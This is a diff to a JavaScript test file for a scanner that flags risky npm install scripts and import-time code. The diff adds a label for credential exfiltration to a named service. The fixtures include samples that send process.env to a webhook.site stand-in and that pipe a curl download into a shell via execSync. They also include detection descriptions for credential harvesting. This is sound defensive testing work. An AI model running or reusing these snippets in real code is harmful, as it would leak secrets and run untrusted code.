@@ -112,6 +112,7 @@ test("install-script and import-time tests", () => {
   const ENV_NET = "reads environment variables or credential files and sends data over the network";
   const PIPE = "pipes a download into a shell";
   const HARVEST = "reads credentials or the whole environment and sends data over the network";
+  const HARVEST_TO = (svc) => `reads credentials or the whole environment and sends them to an exfiltration service (${svc})`;
   const EXEC_PIPE = "runs a downloaded script through a shell";
   const exfil = (dest) => `contacts an address typical of data exfiltration (${dest})`;
   // [text, installScriptRisk, importTimeRisk]
@@ -137,7 +138,7 @@ test("install-script and import-time tests", () => {
     ["ba\u017fe https://pastebin.com.invalid/raw/x", [exfil("pastebin.com")], [[], null]],
     ["const data = JSON.stringify(process.env);\n" +
       "module.exports = (send) => send('https://webhook.site.invalid/0', data);\n",
-      [exfil("webhook.site")], [[HARVEST], 1]],
+      [exfil("webhook.site")], [[HARVEST_TO("webhook.site")], 1]],
     ["const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
       [PIPE], [[EXEC_PIPE], 2]],
     // a CLI's help text is not an exec call
